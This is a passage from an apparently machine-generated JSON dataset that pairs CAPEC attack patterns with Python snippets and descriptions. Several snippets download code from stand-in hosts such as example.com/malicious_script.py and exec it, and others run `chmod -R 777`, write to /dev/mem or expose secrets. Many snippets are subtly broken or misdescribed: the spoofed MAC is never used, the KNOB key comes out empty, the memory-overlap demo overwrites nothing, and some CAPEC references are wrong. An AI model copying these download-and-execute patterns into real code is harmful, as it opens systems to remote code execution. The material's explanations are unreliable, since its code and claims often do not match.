        "code_snippet": "import bluetooth\n\ndef spoof_bluetooth_device(target_mac, spoofed_mac):\n    # Create a Bluetooth socket\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    \n    try:\n        # Connect to the target device using the spoofed MAC address\n        sock.connect((target_mac, 1))\n        \n        # Send a malicious payload\n        sock.send('malicious_payload')\n        \n        print(f'Successfully spoofed {target_mac} using {spoofed_mac}')\n    except bluetooth.btcommon.BluetoothError as err:\n        print(f'Failed to connect: {err}')\n    finally:\n        sock.close()\n\n# Example usage\nspoof_bluetooth_device('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "This Python code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing the MAC address of a Bluetooth device. The function `spoof_bluetooth_device` takes a target MAC address and a spoofed MAC address as inputs. It creates a Bluetooth socket and attempts to connect to the target device using the spoofed MAC address. If the connection is successful, it sends a malicious payload to the target device. This code embodies the main idea of CAPEC-290 by exploiting weak authentication mechanisms (CWE-1390) and improper verification of the source of a communication channel (CWE-940). The code is a simplified representation and should not be used for malicious purposes."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import random\n\nclass BluetoothConnection:\n    def __init__(self):\n        self.entropy_bits = 16  # Vulnerable: Low entropy bits\n        self.key = self.generate_key()\n\n    def generate_key(self):\n        # Vulnerable: Weak key generation due to low entropy\n        return ''.join(random.choice('0123456789ABCDEF') for _ in range(self.entropy_bits // 4))\n\n    def negotiate_key(self, adversary_in_the_middle=False):\n        if adversary_in_the_middle:\n            # Adversary reduces entropy bits to weaken the key\n            self.entropy_bits = 1\n        self.key = self.generate_key()\n        return self.key\n\n# Simulate a Bluetooth key negotiation with an adversary in the middle\nbt_connection = BluetoothConnection()\nprint(f'Original Key: {bt_connection.key}')\nadversary_key = bt_connection.negotiate_key(adversary_in_the_middle=True)\nprint(f'Adversary Key: {adversary_key}')",
        "description": "This Python code snippet simulates a Bluetooth key negotiation process that is vulnerable to the Key Negotiation of Bluetooth Attack (KNOB). The BluetoothConnection class initializes with a low entropy bit count (16 bits), which is already weak. The generate_key method creates a key based on the entropy bits. The negotiate_key method simulates an adversary in the middle attack by reducing the entropy bits to 1, making the key extremely weak and easily guessable. This demonstrates CWE-693 (Protection Mechanism Failure) and CWE-757 (Selection of Less-Secure Algorithm During Negotiation). The code highlights how an attacker can exploit weak key negotiation to decrypt communication between Bluetooth devices."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import requests\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n# Fetching update from an untrusted source\nupdate_url = 'http://untrusted-source.com/update'\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # CWE-506: Embedded Malicious Code\n    # Directly executing the update without verification\n    exec(response.text)\nelse:\n    print('Failed to fetch update')\n\n# CWE-1277 & CWE-1329: Firmware Not Updateable & Reliance on Component That is Not Updateable\n# Simulating a component that cannot be updated\nclass NonUpdateableComponent:\n    def __init__(self):\n        self.version = '1.0'\n\n    def update(self):\n        print('This component cannot be updated')\n\ncomponent = NonUpdateableComponent()\ncomponent.update()\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# Exposing sensitive repository information\nwith open('/path/to/repo/.git/config', 'r') as file:\n    print(file.read())",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the alteration of a software update. It fetches an update from an untrusted source (CWE-807) and executes it without verification (CWE-506), potentially allowing malicious code to run. It also simulates a non-updateable component (CWE-1277 and CWE-1329), highlighting the risk of components that cannot be patched. Finally, it exposes sensitive version control repository information (CWE-527), which could be accessed by unauthorized actors. The code embodies the main idea of CAPEC by showing how an adversary could exploit these weaknesses to alter a software update and introduce malicious behavior."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\n# Malicious function that exposes sensitive information\n# This function is embedded in a seemingly benign tool\n\ndef malicious_function():\n    sensitive_info = os.getenv('SECRET_KEY')  # Assume SECRET_KEY is a sensitive environment variable\n    if sensitive_info:\n        # CWE-497: Exposing sensitive information\n        print(f\"Sensitive Information: {sensitive_info}\")\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Security-critical function that might be optimized away\n\ndef security_critical_function():\n    # Dummy security check\n    security_check = True\n    if security_check:\n        print(\"Security check passed\")\n    else:\n        print(\"Security check failed\")\n\n# Main function that simulates the use of the maliciously altered tool\ndef main():\n    # Call the malicious function\n    malicious_function()\n    # Call the security-critical function\n    security_critical_function()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a scenario where a development tool has been maliciously altered to include a function that exposes sensitive information (CWE-506, CWE-497). The `malicious_function` reads a sensitive environment variable and prints it, representing an unauthorized exposure of sensitive system information. Additionally, the `security_critical_function` includes a dummy security check that could be optimized away by the compiler or processor (CWE-733, CWE-1037), potentially removing or modifying the security-critical code. The `main` function simulates the use of this maliciously altered tool by calling both functions."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASIC:\n    def __init__(self, security_token):\n        self.security_token = security_token\n        self.confidential_data = 'Sensitive Information'\n        self.security_identifier = 'SECURE_ID'\n\n    def access_data(self, token):\n        if token == self.security_token:\n            return self.confidential_data\n        else:\n            return 'Access Denied'\n\n    def modify_requirements(self, new_token, new_identifier):\n        # Maliciously altering the security token and identifier\n        self.security_token = new_token\n        self.security_identifier = new_identifier\n\n# Example usage\nasic = ASIC('VALID_TOKEN')\nprint(asic.access_data('VALID_TOKEN'))  # Should print 'Sensitive Information'\n\n# Malicious alteration of requirements\nasic.modify_requirements('INVALID_TOKEN', 'INSECURE_ID')\nprint(asic.access_data('VALID_TOKEN'))  # Should print 'Access Denied'\nprint(asic.access_data('INVALID_TOKEN'))  # Should print 'Sensitive Information'",
        "description": "This Python code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered'. The ASIC class simulates an application-specific integrated circuit with a security token mechanism and a security identifier. The 'modify_requirements' method demonstrates how an adversary could maliciously alter the security token and identifier, leading to unauthorized access to confidential data. This alteration embodies the vulnerabilities described in the related CWEs, such as improper restriction of security token assignment (CWE-1259), insecure security identifier mechanism (CWE-1294), and unprotected confidential information (CWE-1297). The code highlights the potential impact of such malicious alterations on the security and functionality of the ASIC."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class MaliciousChip:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulating memory-mapped I/O registers\n        self.security_token = 'valid_token'\n\n    def program_chip(self):\n        # Malicious code implanted during chip programming\n        self.registers[0] = 0xDEADBEEF  # CWE-506: Embedded Malicious Code\n        self.security_token = 'malicious_token'  # CWE-1259: Improper Restriction of Security Token Assignment\n\n    def execute(self):\n        if self.security_token == 'malicious_token':\n            self.remote_control()  # CWE-509: Replicating Malicious Code\n\n    def remote_control(self):\n        print('Remote control activated!')\n\n    def access_register(self, index):\n        if index < len(self.registers):\n            return self.registers[index]  # CWE-1262: Improper Access Control for Register Interface\n        else:\n            return None\n\n# Simulating the chip programming process\nchip = MaliciousChip()\nchip.program_chip()\nchip.execute()",
        "description": "This Python code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The `MaliciousChip` class represents a chip with memory-mapped I/O registers and a security token mechanism. During the `program_chip` method, malicious code is implanted by altering a register value (CWE-506) and improperly assigning a security token (CWE-1259). The `execute` method checks for the malicious token and activates remote control functionality (CWE-509). The `access_register` method demonstrates improper access control to the registers (CWE-1262). This code embodies the idea of an adversary altering a chip's logic during programming to enable remote control and other malicious activities when the chip is in use."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# Save the downloaded code to a file\nwith open('downloaded_code.py', 'w') as file:\n    file.write(response.text)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# The downloaded code contains hidden malicious functionality\nexec(open('downloaded_code.py').read())\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\n# Debugging code that exposes sensitive information\nDEBUG = True\nif DEBUG:\n    print('Sensitive Information: API_KEY=12345')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n# Exposing the .git directory to unauthorized access\nos.system('cp -r .git /tmp/exposed_git')",
        "description": "This Python code snippet demonstrates a scenario where a developer inadvertently signs and deploys maliciously altered software. The code downloads a Python script from a remote location without verifying its integrity (CWE-494). The downloaded script is then executed, potentially containing hidden malicious functionality (CWE-506, CWE-507). Additionally, the code includes debugging statements that expose sensitive information (CWE-215). Finally, it copies the .git directory to a location that could be accessed by unauthorized actors (CWE-527). This snippet embodies the main idea of CAPEC-445, where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import random\n\nclass FPGA:\n    def __init__(self):\n        self.configuration = self.load_configuration()\n\n    def load_configuration(self):\n        # Simulate loading a configuration that could be maliciously altered\n        config = {'function': 'normal_operation'}\n        if random.choice([True, False]):\n            config['function'] = 'malicious_operation'  # CWE-506: Embedded Malicious Code\n        return config\n\n    def execute(self):\n        if self.configuration['function'] == 'malicious_operation':\n            self.malicious_function()\n        else:\n            self.normal_function()\n\n    def normal_function(self):\n        print(\"Executing normal operation.\")\n\n    def malicious_function(self):\n        print(\"Executing malicious operation!\")  # CWE-1037: Security-critical code altered\n\n# Simulate FPGA reload\nfpga = FPGA()\nfpga.execute()",
        "description": "This Python code snippet simulates the concept of an FPGA being maliciously altered, as described in the CAPEC. The FPGA class has a method to load its configuration, which can randomly be set to a 'malicious_operation' to represent CWE-506 (Embedded Malicious Code). The execute method checks the configuration and runs either a normal or malicious function, demonstrating CWE-1037 (Processor Optimization Removal or Modification of Security-critical Code). This snippet highlights the risk of an adversary altering the FPGA's configuration to introduce malicious functionality."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, data):\n        self.data = data  # CWE-316: Storing sensitive information in cleartext\n\n    def decommission(self):\n        # CWE-1266: Improper scrubbing of sensitive data\n        # CWE-1301: Insufficient or incomplete data removal\n        self.data = None  # Attempt to remove data, but not securely\n        print('Device decommissioned, data set to None.')\n\n    def read_data(self):\n        if self.data is not None:\n            return self.data\n        else:\n            return 'No data available'\n\n# Simulate device usage\nsensitive_data = 'Sensitive Information'\ndevice = Device(sensitive_data)\nprint('Data before decommission:', device.read_data())\ndevice.decommission()\nprint('Data after decommission:', device.read_data())\n\n# CWE-226: Sensitive information not removed before reuse\n# Simulate adversary retrieving data from decommissioned device\nretrieved_data = device.data  # Data might still be retrievable\nprint('Retrieved data from decommissioned device:', retrieved_data)",
        "description": "This Python code snippet simulates a scenario where a device containing sensitive information is decommissioned. The `Device` class stores sensitive data in cleartext (CWE-316). The `decommission` method attempts to remove the data by setting it to `None`, but this is not a secure method of data removal (CWE-1266, CWE-1301). The `read_data` method allows for reading the data if it is still present. After decommissioning, the code simulates an adversary attempting to retrieve data from the decommissioned device, demonstrating that the data might still be accessible (CWE-226). This snippet highlights the risks associated with improper data scrubbing and incomplete data removal from decommissioned devices, as described in the CAPEC."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from flask import Flask, request\nimport pymongo\n\napp = Flask(__name__)\nclient = pymongo.MongoClient('mongodb://localhost:27017/')\ndb = client['testdb']\ncollection = db['users']\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    query = {'username': username, 'password': password}\n    user = collection.find_one(query)\n    if user:\n        return 'Login successful!'\n    else:\n        return 'Invalid credentials!'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a NoSQL injection vulnerability in a Flask web application using MongoDB. The '/login' endpoint accepts 'username' and 'password' from a POST request and constructs a query to find a matching user in the 'users' collection. The query is directly constructed using user input without proper validation or neutralization of special elements, making it susceptible to NoSQL injection attacks. An attacker could manipulate the input to bypass authentication or execute arbitrary commands, highlighting the risks described in CAPEC-943, CAPEC-1286, and related CWEs."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-1262: Improper Access Control for Register Interface\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef malicious_payload():\n    # Simulate malicious code that alters server functionality\n    os.system('echo Malicious code executed')\n\n    # Simulate improper access control to hardware registers\n    try:\n        with open('/dev/mem', 'rb+') as f:\n            f.seek(0x1000)  # Arbitrary address\n            f.write(b'\\x00\\x01\\x02\\x03')  # Malicious data\n    except PermissionError:\n        print('Access to hardware registers denied')\n\n    # Simulate exposure of sensitive system information\n    sensitive_info = 'Sensitive system information'\n    with open('/tmp/sensitive_info.txt', 'w') as f:\n        f.write(sensitive_info)\n\n    # Simulate improper management of sensitive trace data\n    trace_data = 'Trace data from SoC'\n    with open('/tmp/trace_data.txt', 'w') as f:\n        f.write(trace_data)\n\nif __name__ == '__main__':\n    malicious_payload()",
        "description": "This Python code snippet simulates a malicious payload that embodies the main idea of the CAPEC 'Server Motherboard Compromise'. The code includes several CWE-related vulnerabilities: embedding malicious code (CWE-506), attempting to access and modify hardware registers without proper access control (CWE-1262), exposing sensitive system information (CWE-497), and improperly managing sensitive trace data (CWE-1323). The code demonstrates how an adversary might insert malicious software into a server's hardware components to alter its functionality and compromise sensitive information."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-426: Untrusted Search Path\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-209: Generation of Error Message Containing Sensitive Information\n\ndef build_system(config_path):\n    try:\n        # Read configuration file (potentially maliciously altered)\n        with open(config_path, 'r') as config_file:\n            config_data = config_file.read()\n\n        # Use a temporary file insecurely\n        temp_file = tempfile.NamedTemporaryFile(delete=False)\n        temp_file.write(config_data.encode())\n        temp_file.close()\n\n        # Execute a command using an untrusted search path\n        os.system(f'/usr/local/bin/build_tool --config {temp_file.name}')\n\n    except Exception as e:\n        # Generate an error message containing sensitive information\n        print(f'Error during build: {e}')\n\n# Example usage\nbuild_system('/path/to/config')",
        "description": "This Python code snippet demonstrates a system build process that is vulnerable to several security weaknesses. The function `build_system` reads a configuration file, which could be maliciously altered (CAPEC-153). It then writes the configuration data to a temporary file insecurely (CWE-377) and executes a build command using an untrusted search path (CWE-426). If an error occurs, it generates an error message that may contain sensitive information (CWE-209). Additionally, the code does not properly control dynamically-managed code resources (CWE-913), as it directly reads from and writes to files without proper validation or sanitization. This example highlights the risks associated with improper handling of system build data and configuration files."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "import ctypes\n\n# Simulate a memory region with ctypes\nclass MemoryRegion(ctypes.Structure):\n    _fields_ = [\n        ('protected_data', ctypes.c_char * 64),\n        ('unprotected_data', ctypes.c_char * 64)\n    ]\n\n# Initialize memory region\nmemory = MemoryRegion()\n\n# Simulate improper access control by allowing write access to protected data\nmemory.protected_data = b'A' * 64  # This should be immutable\nmemory.unprotected_data = b'B' * 64\n\n# Vulnerable code: Overlapping memory regions\n# This allows writing to protected_data via unprotected_data\nctypes.memmove(ctypes.addressof(memory.unprotected_data), b'C' * 64, 64)\n\nprint(memory.protected_data)",
        "description": "This Python code snippet simulates a memory region with both protected and unprotected data using the ctypes library. The 'protected_data' is intended to be immutable, but due to improper access control, it can be overwritten via the 'unprotected_data' region. This demonstrates the exploitation of improperly configured memory protections, where overlapping memory regions allow an attacker to bypass intended protections and modify protected data. The code embodies the main idea of CAPEC by showcasing how missing or incorrect access control in memory can be exploited, with context from related CWEs such as insufficient granularity of address regions and improper handling of overlapping protected memory ranges."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegister:\n    def __init__(self):\n        self.registers = {'config': 0x0, 'lock_bit': 0x0}\n\n    def write_register(self, register, value):\n        if register == 'lock_bit' and self.registers['lock_bit'] == 0x1:\n            print('Error: Cannot modify lock bit once set.')\n            return\n        self.registers[register] = value\n        print(f'Register {register} set to {hex(value)}')\n\n    def read_register(self, register):\n        return self.registers.get(register, 'Register not found')\n\n# Example usage\nhw_reg = HardwareRegister()\n\n# Improperly setting lock bit\nhw_reg.write_register('lock_bit', 0x1)\n\n# Attempting to modify lock bit after it is set\nhw_reg.write_register('lock_bit', 0x0)\n\n# Improper access control: modifying config register\nhw_reg.write_register('config', 0xFF)\nprint(f'Config register value: {hex(hw_reg.read_register('config'))}')",
        "description": "This Python code snippet simulates a hardware register interface with improper access control and lock bit protection. The `HardwareRegister` class contains a dictionary representing registers, including a 'config' register and a 'lock_bit'. The `write_register` method allows writing to registers but includes a check to prevent modifying the 'lock_bit' once it is set. However, this check is insufficient as it does not prevent unauthorized access to other registers like 'config'. The example usage demonstrates setting the 'lock_bit', attempting to modify it after it is set (which should fail), and modifying the 'config' register without proper access control. This embodies the main idea of the CAPEC by showing how missing or incorrect access control can be exploited to read/write data in registers."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def assign_token(self, entity, token):\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        self.security_tokens[entity] = token\n\n    def check_access(self, entity, action):\n        token = self.security_tokens.get(entity)\n        if not token:\n            # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n            print(f\"Access denied for {entity}: No security token assigned.\")\n            return False\n        # CWE-1270: Generation of Incorrect Security Tokens\n        if token != 'VALID_TOKEN':\n            print(f\"Access denied for {entity}: Invalid security token.\")\n            return False\n        # CWE-1294: Insecure Security Identifier Mechanism\n        if action not in ['read', 'write']:\n            print(f\"Access denied for {entity}: Unauthorized action.\")\n            return False\n        print(f\"Access granted for {entity} to perform {action}.\")\n        return True\n\n# Example usage\nsoc = SoC()\nsoc.assign_token('entity1', 'INVALID_TOKEN')  # Improper token assignment\nsoc.check_access('entity1', 'read')  # Should be denied due to invalid token\nsoc.check_access('entity2', 'write')  # Should be denied due to missing token\nsoc.assign_token('entity1', 'VALID_TOKEN')\nsoc.check_access('entity1', 'execute')  # Should be denied due to unauthorized action\nsoc.check_access('entity1', 'read')  # Should be granted",
        "description": "This Python code snippet represents a simplified System-on-Chip (SoC) security mechanism that uses security tokens to control access to certain actions. The `SoC` class has methods to assign tokens to entities and check their access rights. The code demonstrates several vulnerabilities: improper restriction of security token assignment (CWE-1259), missing source identifier in transactions (CWE-1302), generation of incorrect security tokens (CWE-1270), and insecure security identifier mechanism (CWE-1294). The example usage shows how these vulnerabilities can lead to unauthorized access or denial of legitimate actions."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device:\n    def __init__(self, firmware_version, rom_code):\n        self.firmware_version = firmware_version\n        self.rom_code = rom_code\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n        self.rom_patchable = False  # CWE-1310: Missing Ability to Patch ROM Code\n\n    def check_for_updates(self):\n        if not self.updateable:\n            print(\"Firmware update not supported.\")\n        else:\n            print(\"Checking for firmware updates...\")\n\n    def patch_rom(self):\n        if not self.rom_patchable:\n            print(\"ROM patching not supported.\")\n        else:\n            print(\"Patching ROM...\")\n\n# Example usage\nmy_device = Device(firmware_version=\"1.0\", rom_code=\"ABC123\")\nmy_device.check_for_updates()\nmy_device.patch_rom()",
        "description": "This Python code defines a `Device` class that simulates a device with unpatchable firmware and ROM code, embodying the main idea of CAPEC-Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities. The `Device` class has attributes to indicate whether the firmware and ROM code are updateable or patchable, respectively. The `check_for_updates` and `patch_rom` methods print messages indicating the lack of support for updates and patches, reflecting CWE-1277 and CWE-1310. This code snippet demonstrates how a device can be left vulnerable due to the inability to update or patch its firmware and ROM code."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    exec(response.text)  # Execute the downloaded script without verification\n\n# CWE-1230: Exposure of Sensitive Information Through Metadata\nmetadata = {'author': 'trusted_author', 'version': '1.0'}\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-290: Authentication Bypass by Spoofing\nif metadata['author'] == 'trusted_author':\n    print('Metadata verified, executing script...')\nelse:\n    print('Metadata spoofed, aborting execution.')",
        "description": "This Python code snippet demonstrates a scenario where metadata spoofing can occur. The script downloads and executes a Python script from a remote URL without performing any integrity checks (CWE-494). It uses metadata to verify the source, but the metadata can be easily spoofed (CWE-348, CWE-290). The metadata is exposed and used to make a critical security decision (CWE-1230). Additionally, the destination for the communication channel is not correctly specified, which could lead to further vulnerabilities (CWE-941). This code embodies the main idea of CAPEC-139: Metadata Spoofing, by showing how an adversary can alter metadata to present a malicious resource as legitimate."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\nimport hashlib\n\n# URL of the open-source software to download\nurl = 'http://example.com/malicious-package.tar.gz'\n\n# Download the software without integrity check\nresponse = requests.get(url)\n\n# Save the downloaded file\nwith open('package.tar.gz', 'wb') as file:\n    file.write(response.content)\n\n# Simulate the use of the downloaded package\n# (In a real scenario, this could be extracting and executing the package)\nprint('Downloaded and saved package.tar.gz')\n\n# No verification of the source or integrity of the downloaded package\n# This could lead to execution of malicious code embedded in the package",
        "description": "This Python code snippet demonstrates the vulnerability described in the CAPEC 'Spoof Open-Source Software Metadata'. The code downloads a package from a specified URL without performing any integrity checks or verifying the source. This embodies CWE-494 (Download of Code Without Integrity Check) and CWE-348 (Use of Less Trusted Source). The downloaded package could contain malicious code (CWE-506) and could be from a spoofed source, bypassing authentication (CWE-290). Additionally, the package could have dependencies on vulnerable third-party components (CWE-1395). This example highlights the risks of downloading and using software without proper verification, potentially leading to the execution of malicious code."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious.example.com/repo.git'\nsubprocess.run(['git', 'clone', url, 'repo'])\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nos.system('chmod -R 777 repo')\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'http://trusted.example.com/repo.git'\nsubprocess.run(['git', 'remote', 'add', 'trusted', trusted_url])\nsubprocess.run(['git', 'fetch', 'trusted'])\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\nwith open('repo/config.py', 'w') as f:\n    f.write(\"API_KEY = 'sensitive_information'\")\n\n# CWE-508: Non-Replicating Malicious Code\nwith open('repo/malicious.py', 'w') as f:\n    f.write(\"print('This is a malicious script')\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary spoofs metadata in a Version Control System (VCS) repository to deceive users. The code clones a repository from a potentially malicious URL without verifying its integrity (CWE-494). It then sets permissions that expose the repository to unauthorized access (CWE-527). The code adds a less trusted remote source (CWE-348) and includes sensitive information directly in the source code (CWE-540). Finally, it adds a non-replicating malicious script to the repository (CWE-508). This snippet embodies the main idea of the CAPEC by showing how an attacker can manipulate VCS metadata and repository contents to mislead users and introduce vulnerabilities."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_package.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_package.py', 'wb') as file:\n    file.write(response.content)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nsubprocess.run(['git', 'clone', 'http://example.com/malicious_repo.git'])\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'https://trustedsource.com/package.py'\nless_trusted_url = 'http://example.com/malicious_package.py'\nresponse = requests.get(less_trusted_url)\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nsubprocess.run(['pip', 'install', 'vulnerable_package'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits multiple weaknesses to deceive users into downloading and executing malicious code. The code downloads a Python script from an untrusted source without verifying its integrity (CWE-494), writes potentially malicious content to a file (CWE-506), clones a repository from an unauthorized source (CWE-527), chooses a less trusted source over a more trusted one (CWE-348), and installs a known vulnerable third-party package (CWE-1395). This embodies the main idea of the 'StarJacking' CAPEC, where software popularity metadata is spoofed to trick users into trusting and using malicious packages."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport time\nimport locale\n\n# Function to gather system location information\ndef gather_system_info():\n    system_info = {}\n    \n    # Get timezone information\n    system_info['timezone'] = time.tzname\n    \n    # Get system locale information\n    system_info['locale'] = locale.getdefaultlocale()\n    \n    # Get keyboard layout (simulated as this is OS dependent)\n    system_info['keyboard_layout'] = os.getenv('KEYBOARD_LAYOUT', 'Unknown')\n    \n    return system_info\n\n# Function to simulate exposure of sensitive system information\ndef expose_sensitive_info():\n    info = gather_system_info()\n    \n    # Simulate exposure by printing the information\n    print(\"Sensitive System Information:\")\n    for key, value in info.items():\n        print(f\"{key}: {value}\")\n\n# Main execution\nif __name__ == '__main__':\n    expose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of 'System Location Discovery' by gathering and exposing sensitive system information such as timezone, locale, and keyboard layout. The `gather_system_info` function collects this information, and the `expose_sensitive_info` function simulates the exposure of this sensitive data by printing it to the console. This code embodies the CAPEC idea by showing how an adversary might collect and expose system location information. The related CWEs are represented by the potential exposure of sensitive information (CWE-497), improper access control (CWE-529), and the trust of system event data (CWE-360)."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nsubprocess.run(['git', 'clone', 'http://example.com/malicious_repo.git'])\n\n# CWE-426: Untrusted Search Path\nimport sys\nsys.path.append('/untrusted/path')\nimport malicious_module",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the concept of 'Repo Jacking'. The code downloads and executes a script from an untrusted URL without verifying its integrity (CWE-494). It includes functionality from an untrusted source (CWE-829) by executing the downloaded script. The code also clones a potentially malicious repository (CWE-527) and modifies the search path to include an untrusted directory (CWE-426), allowing the import of a potentially malicious module. These actions collectively illustrate how an adversary could exploit these weaknesses to inject malicious code into an application."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\nimport mmap\nimport os\nimport struct\n\n# Allocate a memory page\npage_size = mmap.PAGESIZE\nfd = os.open('/dev/zero', os.O_RDWR)\nmem = mmap.mmap(fd, page_size, mmap.MAP_PRIVATE, mmap.PROT_READ | mmap.PROT_WRITE)\nos.close(fd)\n\n# Induce a page fault by accessing an invalid memory address\ntry:\n    invalid_address = ctypes.c_void_p(0xdeadbeef)\n    ctypes.string_at(invalid_address, 1)\nexcept ValueError as e:\n    print(f'Page fault induced: {e}')\n\n# Simulate transient execution by accessing microarchitectural buffers\n# This is a simplified representation and does not perform actual transient execution\nbuffer = struct.pack('Q', 0x4141414141414141)  # Adversary-controlled data\nmem.write(buffer)\n\n# Read the data back, simulating a side-channel attack\nmem.seek(0)\nleaked_data = mem.read(8)\nprint(f'Leaked data: {leaked_data}')",
        "description": "This Python code snippet demonstrates a simplified version of Load Value Injection (LVI) by inducing a page fault and simulating transient execution. The code allocates a memory page, induces a page fault by accessing an invalid memory address, and then writes adversary-controlled data to a memory buffer. Finally, it reads the data back, simulating a side-channel attack to leak sensitive information. This example embodies the main idea of exploiting hardware design flaws in CPU implementations to manipulate transient execution and extract sensitive data."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
